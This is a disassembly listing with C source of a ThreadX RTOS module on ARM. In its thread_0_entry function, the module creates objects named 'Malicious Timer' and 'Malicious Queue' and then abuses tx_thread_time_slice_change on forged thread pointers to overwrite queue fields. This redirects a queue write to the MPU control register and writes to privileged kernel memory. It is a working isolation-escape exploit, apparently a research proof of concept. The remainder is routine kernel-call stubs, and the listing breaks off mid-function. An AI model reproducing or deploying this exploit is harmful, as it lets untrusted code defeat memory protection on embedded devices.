
Tx_Module.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .preamble     0000009c  08020000  08020000  00010000  2**4
                  CONTENTS, ALLOC, LOAD, CODE
  1 .dynsym       00000000  0802009c  08021964  00011964  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  2 .dynstr       00000000  0802009c  08021964  00011964  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  3 .rel.dyn      00000000  0802009c  0802009c  0001009c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .got          00000028  080218f8  080218f8  000118f8  2**2
                  CONTENTS, ALLOC, LOAD, RELOC, DATA
  5 .plt          00000000  0802009c  08021964  00011964  2**0
                  CONTENTS, ALLOC, LOAD, CODE
  6 .interp       00000000  0802009c  0802009c  00011964  2**0
                  CONTENTS
  7 .hash         00000000  0802009c  08021964  00011964  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  8 .text         0000185c  0802009c  0802009c  0001009c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  9 .rodata       00000044  08021920  08021920  00011920  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 10 .fast_run     00000000  2001c028  2001c028  00011964  2**0
                  CONTENTS
 11 .data_run     00000000  2001c028  2001c028  00011964  2**0
                  CONTENTS
 12 .bss          0000082c  2001c028  2001c028  0001c028  2**3
                  ALLOC
 13 .heap         00000080  2001c854  2001c854  0001c028  2**0
                  ALLOC
 14 .debug_info   0001c301  00000000  00000000  00011964  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_abbrev 00005a2b  00000000  00000000  0002dc65  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_aranges 00000ca0  00000000  00000000  00033690  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  0000c422  00000000  00000000  00034330  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   0002d08c  00000000  00000000  00040752  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000150cc  00000000  00000000  0006d7de  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .comment      00000043  00000000  00000000  000828aa  2**0
                  CONTENTS, READONLY
 21 .ARM.attributes 00000032  00000000  00000000  000828ed  2**0
                  CONTENTS, READONLY
 22 .debug_frame  0000165c  00000000  00000000  00082920  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 23 .debug_line_str 000000a1  00000000  00000000  00083f7c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .preamble:

08020000 <__preamble_start__>:
 8020000:	4d4f4455 	.word	0x4d4f4455
 8020004:	00000006 	.word	0x00000006
 8020008:	00000001 	.word	0x00000001
 802000c:	00000020 	.word	0x00000020
 8020010:	12345678 	.word	0x12345678
 8020014:	02000007 	.word	0x02000007
 8020018:	0000097d 	.word	0x0000097d
 802001c:	00000081 	.word	0x00000081
 8020020:	00000000 	.word	0x00000000
 8020024:	00000001 	.word	0x00000001
 8020028:	00000400 	.word	0x00000400
 802002c:	000007e1 	.word	0x000007e1
 8020030:	00000001 	.word	0x00000001
 8020034:	00000400 	.word	0x00000400
 8020038:	00001964 	.word	0x00001964
 802003c:	000008d4 	.word	0x000008d4
	...
 8020080:	00001b41 	.word	0x00001b41
 8020084:	61656100 	.word	0x61656100
 8020088:	01006962 	.word	0x01006962
 802008c:	00000011 	.word	0x00000011
 8020090:	2d453705 	.word	0x2d453705
 8020094:	0d06004d 	.word	0x0d06004d
 8020098:	02094d07 	.word	0x02094d07

Disassembly of section .text:

0802009c <default_module_start>:
void thread_0_entry(ULONG thread_input);
void Error_Handler(void);

/* Module entry function */
void    default_module_start(ULONG id)
{
 802009c:	b580      	push	{r7, lr}
 802009e:	b08c      	sub	sp, #48	; 0x30
 80200a0:	af08      	add	r7, sp, #32
 80200a2:	6078      	str	r0, [r7, #4]
    CHAR    *pointer;

    /* Allocate all the objects. In MPU mode, modules cannot allocate control blocks within
       their own memory area so they cannot corrupt the resident portion of ThreadX by overwriting
       the control block(s).  */
    txm_module_object_allocate((void*)&thread_0, sizeof(TX_THREAD));
 80200a4:	21e8      	movs	r1, #232	; 0xe8
 80200a6:	4b23      	ldr	r3, [pc, #140]	; (8020134 <default_module_start+0x98>)
 80200a8:	f859 3003 	ldr.w	r3, [r9, r3]
 80200ac:	4618      	mov	r0, r3
 80200ae:	f000 fc0f 	bl	80208d0 <_txm_module_object_allocate>
    txm_module_object_allocate((void*)&byte_pool_0, sizeof(TX_BYTE_POOL));
 80200b2:	2134      	movs	r1, #52	; 0x34
 80200b4:	4b20      	ldr	r3, [pc, #128]	; (8020138 <default_module_start+0x9c>)
 80200b6:	f859 3003 	ldr.w	r3, [r9, r3]
 80200ba:	4618      	mov	r0, r3
 80200bc:	f000 fc08 	bl	80208d0 <_txm_module_object_allocate>

    /* Create a byte memory pool from which to allocate the thread stacks.  */
    tx_byte_pool_create(byte_pool_0, "module byte pool 0", (UCHAR*)default_module_pool_space, DEFAULT_BYTE_POOL_SIZE);
 80200c0:	4b1d      	ldr	r3, [pc, #116]	; (8020138 <default_module_start+0x9c>)
 80200c2:	f859 3003 	ldr.w	r3, [r9, r3]
 80200c6:	6818      	ldr	r0, [r3, #0]
 80200c8:	2334      	movs	r3, #52	; 0x34
 80200ca:	9300      	str	r3, [sp, #0]
 80200cc:	f44f 6300 	mov.w	r3, #2048	; 0x800
 80200d0:	4a1a      	ldr	r2, [pc, #104]	; (802013c <default_module_start+0xa0>)
 80200d2:	f859 2002 	ldr.w	r2, [r9, r2]
 80200d6:	491a      	ldr	r1, [pc, #104]	; (8020140 <default_module_start+0xa4>)
 80200d8:	4479      	add	r1, pc
 80200da:	f000 f9d1 	bl	8020480 <_txe_byte_pool_create>

    /* Allocate the stack for thread 0.  */
    tx_byte_allocate(byte_pool_0, (VOID **) &pointer, DEFAULT_STACK_SIZE, TX_NO_WAIT);
 80200de:	4b16      	ldr	r3, [pc, #88]	; (8020138 <default_module_start+0x9c>)
 80200e0:	f859 3003 	ldr.w	r3, [r9, r3]
 80200e4:	6818      	ldr	r0, [r3, #0]
 80200e6:	f107 010c 	add.w	r1, r7, #12
 80200ea:	2300      	movs	r3, #0
 80200ec:	f44f 7200 	mov.w	r2, #512	; 0x200
 80200f0:	f000 f9a8 	bl	8020444 <_txe_byte_allocate>

    /* Create the main thread.  */
    tx_thread_create(thread_0, "module thread 0", thread_0_entry, 0,
 80200f4:	4b0f      	ldr	r3, [pc, #60]	; (8020134 <default_module_start+0x98>)
 80200f6:	f859 3003 	ldr.w	r3, [r9, r3]
 80200fa:	6818      	ldr	r0, [r3, #0]
 80200fc:	68fb      	ldr	r3, [r7, #12]
 80200fe:	22e8      	movs	r2, #232	; 0xe8
 8020100:	9206      	str	r2, [sp, #24]
 8020102:	2201      	movs	r2, #1
 8020104:	9205      	str	r2, [sp, #20]
 8020106:	2200      	movs	r2, #0
 8020108:	9204      	str	r2, [sp, #16]
 802010a:	2202      	movs	r2, #2
 802010c:	9203      	str	r2, [sp, #12]
 802010e:	2202      	movs	r2, #2
 8020110:	9202      	str	r2, [sp, #8]
 8020112:	f44f 7200 	mov.w	r2, #512	; 0x200
 8020116:	9201      	str	r2, [sp, #4]
 8020118:	9300      	str	r3, [sp, #0]
 802011a:	2300      	movs	r3, #0
 802011c:	4a09      	ldr	r2, [pc, #36]	; (8020144 <default_module_start+0xa8>)
 802011e:	f859 2002 	ldr.w	r2, [r9, r2]
 8020122:	4909      	ldr	r1, [pc, #36]	; (8020148 <default_module_start+0xac>)
 8020124:	4479      	add	r1, pc
 8020126:	f000 ffa3 	bl	8021070 <_txe_thread_create>
            pointer, DEFAULT_STACK_SIZE,
            2, 2, TX_NO_TIME_SLICE, TX_AUTO_START);

}
 802012a:	bf00      	nop
 802012c:	3710      	adds	r7, #16
 802012e:	46bd      	mov	sp, r7
 8020130:	bd80      	pop	{r7, pc}
 8020132:	bf00      	nop
 8020134:	00000014 	.word	0x00000014
 8020138:	00000010 	.word	0x00000010
 802013c:	0000000c 	.word	0x0000000c
 8020140:	00001844 	.word	0x00001844
 8020144:	00000018 	.word	0x00000018
 8020148:	0000180c 	.word	0x0000180c

0802014c <MaliciousTimerFunction>:

void MaliciousTimerFunction(void){}
 802014c:	b480      	push	{r7}
 802014e:	af00      	add	r7, sp, #0
 8020150:	bf00      	nop
 8020152:	46bd      	mov	sp, r7
 8020154:	f85d 7b04 	ldr.w	r7, [sp], #4
 8020158:	4770      	bx	lr

0802015a <MainThread_Entry>:

void MainThread_Entry(ULONG thread_input){}
 802015a:	b480      	push	{r7}
 802015c:	b083      	sub	sp, #12
 802015e:	af00      	add	r7, sp, #0
 8020160:	6078      	str	r0, [r7, #4]
 8020162:	bf00      	nop
 8020164:	370c      	adds	r7, #12
 8020166:	46bd      	mov	sp, r7
 8020168:	f85d 7b04 	ldr.w	r7, [sp], #4
 802016c:	4770      	bx	lr

0802016e <thread_0_entry>:

/* Module main thread function */
void thread_0_entry(ULONG thread_input)
{
 802016e:	b580      	push	{r7, lr}
 8020170:	b08c      	sub	sp, #48	; 0x30
 8020172:	af04      	add	r7, sp, #16
 8020174:	6078      	str	r0, [r7, #4]
//    Error_Handler();
//  }

  CHAR *pointer;
  TX_TIMER *MaliciousTimer;
  txm_module_object_allocate((void*)&MaliciousTimer, sizeof(TX_TIMER));
 8020176:	f107 0314 	add.w	r3, r7, #20
 802017a:	2134      	movs	r1, #52	; 0x34
 802017c:	4618      	mov	r0, r3
 802017e:	f000 fba7 	bl	80208d0 <_txm_module_object_allocate>
  tx_timer_create(MaliciousTimer, "Malicious Timer", MaliciousTimerFunction, 0x54485244, 0x54485244, 0x54485244, TX_NO_ACTIVATE);
 8020182:	6978      	ldr	r0, [r7, #20]
 8020184:	2334      	movs	r3, #52	; 0x34
 8020186:	9303      	str	r3, [sp, #12]
 8020188:	2300      	movs	r3, #0
 802018a:	9302      	str	r3, [sp, #8]
 802018c:	4b34      	ldr	r3, [pc, #208]	; (8020260 <thread_0_entry+0xf2>)
 802018e:	9301      	str	r3, [sp, #4]
 8020190:	4b33      	ldr	r3, [pc, #204]	; (8020260 <thread_0_entry+0xf2>)
 8020192:	9300      	str	r3, [sp, #0]
 8020194:	4b32      	ldr	r3, [pc, #200]	; (8020260 <thread_0_entry+0xf2>)
 8020196:	4a34      	ldr	r2, [pc, #208]	; (8020268 <thread_0_entry+0xfa>)
 8020198:	f859 2002 	ldr.w	r2, [r9, r2]
 802019c:	4933      	ldr	r1, [pc, #204]	; (802026c <thread_0_entry+0xfe>)
 802019e:	4479      	add	r1, pc
 80201a0:	f001 f9b2 	bl	8021508 <_txe_timer_create>

  TX_QUEUE *MaliciousQueue;
  txm_module_object_allocate((void*)&MaliciousQueue, sizeof(TX_QUEUE));
 80201a4:	f107 0310 	add.w	r3, r7, #16
 80201a8:	2144      	movs	r1, #68	; 0x44
 80201aa:	4618      	mov	r0, r3
 80201ac:	f000 fb90 	bl	80208d0 <_txm_module_object_allocate>
  tx_byte_allocate(byte_pool_0, (VOID **) &pointer, 16 * sizeof(ULONG), TX_NO_WAIT);
 80201b0:	4b2f      	ldr	r3, [pc, #188]	; (8020270 <thread_0_entry+0x102>)
 80201b2:	f859 3003 	ldr.w	r3, [r9, r3]
 80201b6:	6818      	ldr	r0, [r3, #0]
 80201b8:	f107 0118 	add.w	r1, r7, #24
 80201bc:	2300      	movs	r3, #0
 80201be:	2240      	movs	r2, #64	; 0x40
 80201c0:	f000 f940 	bl	8020444 <_txe_byte_allocate>
  tx_queue_create(MaliciousQueue, "Malicious Queue",TX_1_ULONG, pointer, 16 * sizeof(ULONG));
 80201c4:	6938      	ldr	r0, [r7, #16]
 80201c6:	69bb      	ldr	r3, [r7, #24]
 80201c8:	2244      	movs	r2, #68	; 0x44
 80201ca:	9201      	str	r2, [sp, #4]
 80201cc:	2240      	movs	r2, #64	; 0x40
 80201ce:	9200      	str	r2, [sp, #0]
 80201d0:	2201      	movs	r2, #1
 80201d2:	4928      	ldr	r1, [pc, #160]	; (8020274 <thread_0_entry+0x106>)
 80201d4:	4479      	add	r1, pc
 80201d6:	f000 fd1d 	bl	8020c14 <_txe_queue_create>
//  MaliciousTimer->tx_timer_id = 0xffffffff;

  ULONG time_slice;
  TX_THREAD *ForgedThread;
  // write queue_write
  ForgedThread = (ULONG) MaliciousTimer + 8;
 80201da:	697b      	ldr	r3, [r7, #20]
 80201dc:	3308      	adds	r3, #8
 80201de:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 80201e0:	f107 030c 	add.w	r3, r7, #12
 80201e4:	461a      	mov	r2, r3
 80201e6:	491e      	ldr	r1, [pc, #120]	; (8020260 <thread_0_entry+0xf2>)
 80201e8:	69f8      	ldr	r0, [r7, #28]
 80201ea:	f001 f909 	bl	8021400 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 32;
 80201ee:	697b      	ldr	r3, [r7, #20]
 80201f0:	3320      	adds	r3, #32
 80201f2:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 80201f4:	f107 030c 	add.w	r3, r7, #12
 80201f8:	461a      	mov	r2, r3
 80201fa:	4919      	ldr	r1, [pc, #100]	; (8020260 <thread_0_entry+0xf2>)
 80201fc:	69f8      	ldr	r0, [r7, #28]
 80201fe:	f001 f8ff 	bl	8021400 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 56;
 8020202:	697b      	ldr	r3, [r7, #20]
 8020204:	3338      	adds	r3, #56	; 0x38
 8020206:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x54485244, &time_slice);
 8020208:	f107 030c 	add.w	r3, r7, #12
 802020c:	461a      	mov	r2, r3
 802020e:	4914      	ldr	r1, [pc, #80]	; (8020260 <thread_0_entry+0xf2>)
 8020210:	69f8      	ldr	r0, [r7, #28]
 8020212:	f001 f8f5 	bl	8021400 <_txe_thread_time_slice_change>
  ForgedThread = (ULONG) MaliciousTimer + 84;
 8020216:	697b      	ldr	r3, [r7, #20]
 8020218:	3354      	adds	r3, #84	; 0x54
 802021a:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0xe000ed94, &time_slice);
 802021c:	f107 030c 	add.w	r3, r7, #12
 8020220:	461a      	mov	r2, r3
 8020222:	4910      	ldr	r1, [pc, #64]	; (8020264 <thread_0_entry+0xf6>)
 8020224:	69f8      	ldr	r0, [r7, #28]
 8020226:	f001 f8eb 	bl	8021400 <_txe_thread_time_slice_change>
  // write queue_message_size
  ForgedThread = (ULONG) MaliciousTimer + 56;
 802022a:	697b      	ldr	r3, [r7, #20]
 802022c:	3338      	adds	r3, #56	; 0x38
 802022e:	61fb      	str	r3, [r7, #28]
  tx_thread_time_slice_change(ForgedThread, 0x4, &time_slice);
 8020230:	f107 030c 	add.w	r3, r7, #12
 8020234:	461a      	mov	r2, r3
 8020236:	2104      	movs	r1, #4
 8020238:	69f8      	ldr	r0, [r7, #28]
 802023a:	f001 f8e1 	bl	8021400 <_txe_thread_time_slice_change>

  ULONG value = 0;
 802023e:	2300      	movs	r3, #0
 8020240:	60bb      	str	r3, [r7, #8]
  //dereference queue_write in queue object
  tx_queue_send(MaliciousQueue, &value, 0);
 8020242:	693b      	ldr	r3, [r7, #16]
 8020244:	f107 0108 	add.w	r1, r7, #8
 8020248:	2200      	movs	r2, #0
 802024a:	4618      	mov	r0, r3
 802024c:	f000 fde0 	bl	8020e10 <_txe_queue_send>

  // write to privileged kernel memory
  MaliciousTimer->tx_timer_id = 0xffffffff;
 8020250:	697b      	ldr	r3, [r7, #20]
 8020252:	f04f 32ff 	mov.w	r2, #4294967295
 8020256:	601a      	str	r2, [r3, #0]
//  *(ULONG *)READONLY_REGION = 0xABABABAB;
//  tx_thread_sleep(TX_TIMER_TICKS_PER_SECOND / 10);
//
//  /* Suppress unused variable warning */
//  UNUSED(readbuffer);
}
 8020258:	bf00      	nop
 802025a:	3720      	adds	r7, #32
 802025c:	46bd      	mov	sp, r7
 802025e:	bd80      	pop	{r7, pc}
 8020260:	54485244 	.word	0x54485244
 8020264:	e000ed94 	.word	0xe000ed94
 8020268:	00000000 	.word	0x00000000
 802026c:	000017a2 	.word	0x000017a2
 8020270:	00000010 	.word	0x00000010
 8020274:	0000177c 	.word	0x0000177c

08020278 <Error_Handler>:

void Error_Handler(void)
{
 8020278:	b580      	push	{r7, lr}
 802027a:	af00      	add	r7, sp, #0
  /* Nothing to do, block here */
  tx_thread_sleep(TX_WAIT_FOREVER);
 802027c:	f04f 30ff 	mov.w	r0, #4294967295
 8020280:	f001 f866 	bl	8021350 <_tx_thread_sleep>
}
 8020284:	bf00      	nop
 8020286:	bd80      	pop	{r7, pc}

08020288 <_txe_block_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_allocate(TX_BLOCK_POOL *pool_ptr, VOID **block_ptr, ULONG wait_option)
{
 8020288:	b590      	push	{r4, r7, lr}
 802028a:	b087      	sub	sp, #28
 802028c:	af00      	add	r7, sp, #0
 802028e:	60f8      	str	r0, [r7, #12]
 8020290:	60b9      	str	r1, [r7, #8]
 8020292:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_ALLOCATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) block_ptr, (ALIGN_TYPE) wait_option);
 8020294:	4b07      	ldr	r3, [pc, #28]	; (80202b4 <_txe_block_allocate+0x2c>)
 8020296:	f859 3003 	ldr.w	r3, [r9, r3]
 802029a:	681c      	ldr	r4, [r3, #0]
 802029c:	68f9      	ldr	r1, [r7, #12]
 802029e:	68ba      	ldr	r2, [r7, #8]
 80202a0:	687b      	ldr	r3, [r7, #4]
 80202a2:	2001      	movs	r0, #1
 80202a4:	47a0      	blx	r4
 80202a6:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80202a8:	697b      	ldr	r3, [r7, #20]
}
 80202aa:	4618      	mov	r0, r3
 80202ac:	371c      	adds	r7, #28
 80202ae:	46bd      	mov	sp, r7
 80202b0:	bd90      	pop	{r4, r7, pc}
 80202b2:	bf00      	nop
 80202b4:	00000004 	.word	0x00000004

080202b8 <_txe_block_pool_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_create(TX_BLOCK_POOL *pool_ptr, CHAR *name_ptr, ULONG block_size, VOID *pool_start, ULONG pool_size, UINT pool_control_block_size)
{
 80202b8:	b590      	push	{r4, r7, lr}
 80202ba:	b08b      	sub	sp, #44	; 0x2c
 80202bc:	af00      	add	r7, sp, #0
 80202be:	60f8      	str	r0, [r7, #12]
 80202c0:	60b9      	str	r1, [r7, #8]
 80202c2:	607a      	str	r2, [r7, #4]
 80202c4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) block_size;
 80202c6:	687b      	ldr	r3, [r7, #4]
 80202c8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) pool_start;
 80202ca:	683b      	ldr	r3, [r7, #0]
 80202cc:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) pool_size;
 80202ce:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80202d0:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) pool_control_block_size;
 80202d2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80202d4:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_CREATE_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80202d6:	4b08      	ldr	r3, [pc, #32]	; (80202f8 <_txe_block_pool_create+0x40>)
 80202d8:	f859 3003 	ldr.w	r3, [r9, r3]
 80202dc:	681c      	ldr	r4, [r3, #0]
 80202de:	68f9      	ldr	r1, [r7, #12]
 80202e0:	68ba      	ldr	r2, [r7, #8]
 80202e2:	f107 0314 	add.w	r3, r7, #20
 80202e6:	2002      	movs	r0, #2
 80202e8:	47a0      	blx	r4
 80202ea:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80202ec:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80202ee:	4618      	mov	r0, r3
 80202f0:	372c      	adds	r7, #44	; 0x2c
 80202f2:	46bd      	mov	sp, r7
 80202f4:	bd90      	pop	{r4, r7, pc}
 80202f6:	bf00      	nop
 80202f8:	00000004 	.word	0x00000004

080202fc <_txe_block_pool_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_delete(TX_BLOCK_POOL *pool_ptr)
{
 80202fc:	b590      	push	{r4, r7, lr}
 80202fe:	b085      	sub	sp, #20
 8020300:	af00      	add	r7, sp, #0
 8020302:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_DELETE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 8020304:	4b07      	ldr	r3, [pc, #28]	; (8020324 <_txe_block_pool_delete+0x28>)
 8020306:	f859 3003 	ldr.w	r3, [r9, r3]
 802030a:	681c      	ldr	r4, [r3, #0]
 802030c:	6879      	ldr	r1, [r7, #4]
 802030e:	2300      	movs	r3, #0
 8020310:	2200      	movs	r2, #0
 8020312:	2003      	movs	r0, #3
 8020314:	47a0      	blx	r4
 8020316:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020318:	68fb      	ldr	r3, [r7, #12]
}
 802031a:	4618      	mov	r0, r3
 802031c:	3714      	adds	r7, #20
 802031e:	46bd      	mov	sp, r7
 8020320:	bd90      	pop	{r4, r7, pc}
 8020322:	bf00      	nop
 8020324:	00000004 	.word	0x00000004

08020328 <_txe_block_pool_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_block_pool_info_get(TX_BLOCK_POOL *pool_ptr, CHAR **name, ULONG *available_blocks, ULONG *total_blocks, TX_THREAD **first_suspended, ULONG *suspended_count, TX_BLOCK_POOL **next_pool)
{
 8020328:	b590      	push	{r4, r7, lr}
 802032a:	b08b      	sub	sp, #44	; 0x2c
 802032c:	af00      	add	r7, sp, #0
 802032e:	60f8      	str	r0, [r7, #12]
 8020330:	60b9      	str	r1, [r7, #8]
 8020332:	607a      	str	r2, [r7, #4]
 8020334:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) available_blocks;
 8020336:	687b      	ldr	r3, [r7, #4]
 8020338:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) total_blocks;
 802033a:	683b      	ldr	r3, [r7, #0]
 802033c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 802033e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020340:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020342:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020344:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_pool;
 8020346:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020348:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 802034a:	4b08      	ldr	r3, [pc, #32]	; (802036c <_txe_block_pool_info_get+0x44>)
 802034c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020350:	681c      	ldr	r4, [r3, #0]
 8020352:	68f9      	ldr	r1, [r7, #12]
 8020354:	68ba      	ldr	r2, [r7, #8]
 8020356:	f107 0310 	add.w	r3, r7, #16
 802035a:	2004      	movs	r0, #4
 802035c:	47a0      	blx	r4
 802035e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020360:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020362:	4618      	mov	r0, r3
 8020364:	372c      	adds	r7, #44	; 0x2c
 8020366:	46bd      	mov	sp, r7
 8020368:	bd90      	pop	{r4, r7, pc}
 802036a:	bf00      	nop
 802036c:	00000004 	.word	0x00000004

08020370 <_tx_block_pool_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_block_pool_performance_info_get(TX_BLOCK_POOL *pool_ptr, ULONG *allocates, ULONG *releases, ULONG *suspensions, ULONG *timeouts)
{
 8020370:	b590      	push	{r4, r7, lr}
 8020372:	b089      	sub	sp, #36	; 0x24
 8020374:	af00      	add	r7, sp, #0
 8020376:	60f8      	str	r0, [r7, #12]
 8020378:	60b9      	str	r1, [r7, #8]
 802037a:	607a      	str	r2, [r7, #4]
 802037c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) releases;
 802037e:	687b      	ldr	r3, [r7, #4]
 8020380:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 8020382:	683b      	ldr	r3, [r7, #0]
 8020384:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 8020386:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020388:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) allocates, (ALIGN_TYPE) extra_parameters);
 802038a:	4b08      	ldr	r3, [pc, #32]	; (80203ac <_tx_block_pool_performance_info_get+0x3c>)
 802038c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020390:	681c      	ldr	r4, [r3, #0]
 8020392:	68f9      	ldr	r1, [r7, #12]
 8020394:	68ba      	ldr	r2, [r7, #8]
 8020396:	f107 0310 	add.w	r3, r7, #16
 802039a:	2005      	movs	r0, #5
 802039c:	47a0      	blx	r4
 802039e:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80203a0:	69fb      	ldr	r3, [r7, #28]
}
 80203a2:	4618      	mov	r0, r3
 80203a4:	3724      	adds	r7, #36	; 0x24
 80203a6:	46bd      	mov	sp, r7
 80203a8:	bd90      	pop	{r4, r7, pc}
 80203aa:	bf00      	nop
 80203ac:	00000004 	.word	0x00000004

080203b0 <_tx_block_pool_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_block_pool_performance_system_info_get(ULONG *allocates, ULONG *releases, ULONG *suspensions, ULONG *timeouts)
{
 80203b0:	b590      	push	{r4, r7, lr}
 80203b2:	b089      	sub	sp, #36	; 0x24
 80203b4:	af00      	add	r7, sp, #0
 80203b6:	60f8      	str	r0, [r7, #12]
 80203b8:	60b9      	str	r1, [r7, #8]
 80203ba:	607a      	str	r2, [r7, #4]
 80203bc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 80203be:	687b      	ldr	r3, [r7, #4]
 80203c0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 80203c2:	683b      	ldr	r3, [r7, #0]
 80203c4:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BLOCK_POOL_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) allocates, (ALIGN_TYPE) releases, (ALIGN_TYPE) extra_parameters);
 80203c6:	4b08      	ldr	r3, [pc, #32]	; (80203e8 <_tx_block_pool_performance_system_info_get+0x38>)
 80203c8:	f859 3003 	ldr.w	r3, [r9, r3]
 80203cc:	681c      	ldr	r4, [r3, #0]
 80203ce:	68f9      	ldr	r1, [r7, #12]
 80203d0:	68ba      	ldr	r2, [r7, #8]
 80203d2:	f107 0314 	add.w	r3, r7, #20
 80203d6:	2006      	movs	r0, #6
 80203d8:	47a0      	blx	r4
 80203da:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80203dc:	69fb      	ldr	r3, [r7, #28]
}
 80203de:	4618      	mov	r0, r3
 80203e0:	3724      	adds	r7, #36	; 0x24
 80203e2:	46bd      	mov	sp, r7
 80203e4:	bd90      	pop	{r4, r7, pc}
 80203e6:	bf00      	nop
 80203e8:	00000004 	.word	0x00000004

080203ec <_txe_block_pool_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
